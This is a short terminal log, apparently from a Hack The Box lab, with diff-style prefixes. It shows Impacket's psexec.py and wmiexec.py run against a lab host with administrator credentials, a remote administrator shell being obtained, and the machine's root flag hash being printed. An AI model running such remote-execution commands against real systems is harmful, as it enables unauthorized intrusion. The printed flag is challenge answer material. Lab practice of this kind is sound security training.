+[*] Uploading file nVynemkR.exe           
+^Z                   
+[3]+  Stopped                 /usr/share/doc/python3-impacket/examples/psexec.py administrator@10.10.10.125                    
+┌─[✗]─[root@parrot]─[~/hackthebox/querrier]                                          
+└──╼ #wmiexec administrator@10.10.10.125  
+-bash: wmiexec: command not found         
+┌─[✗]─[root@parrot]─[~/hackthebox/querrier]                                          
+└──╼ #wmiexec.py administrator@10.10.10.125                                          
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation                         
+
+Password:            
+[*] SMBv3.0 dialect used                  
+[!] Launching semi-interactive shell - Careful what you execute                      
+[!] Press help for extra shell commands   
+C:\>whoami           
+
+querier\administrator                     
+
+C:\>                 
+C:\>cd users/administrator/desktop        
+
+C:\users\administrator\desktop>           
+C:\users\administrator\desktop>more root.txt                                         
+b19c3794f786a1fdcf205f81497c3592          
+
+C:\users\administrator\desktop>           
